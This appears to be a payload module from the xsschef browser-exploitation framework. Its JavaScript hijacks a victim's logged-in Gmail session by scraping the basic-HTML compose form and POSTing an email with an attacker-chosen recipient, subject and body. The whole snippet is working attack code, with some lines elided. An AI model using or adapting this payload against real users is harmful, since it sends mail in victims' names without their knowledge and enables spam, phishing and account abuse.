// send email using logged in Gmail session
//
...
function sendEmail(payload, callback) {
    ajax.ajax({url: 'https://mail.google.com/mail/u/0/?ui=html&zy=s', error: __logEval, success: function (r) {
        ...
        ajax.ajax({url: base + '?&v=b&pv=tl&cs=b', error: __logEval, success: function(r) {
            try {
                var form = r.match(/action="(.*?)"/)[1];
            } catch(e) {
                __logEval('error form', r);
                return;
            };
            function doSend(m, callback) {
                ajax.ajax({type: 'POST', url: base+form, data: {
                    'to': m.to,
                    subject: m.subject || 'hello from xsschef!',
                    body: m.body + '',
                    nvp_bu_send: 'Send',
                }, success: callback, error: __logEval});
            };
            doSend(payload, callback);
        }});
    }});
};

sendEmail(_email, function() {__logEval("E-mail sent successfully")});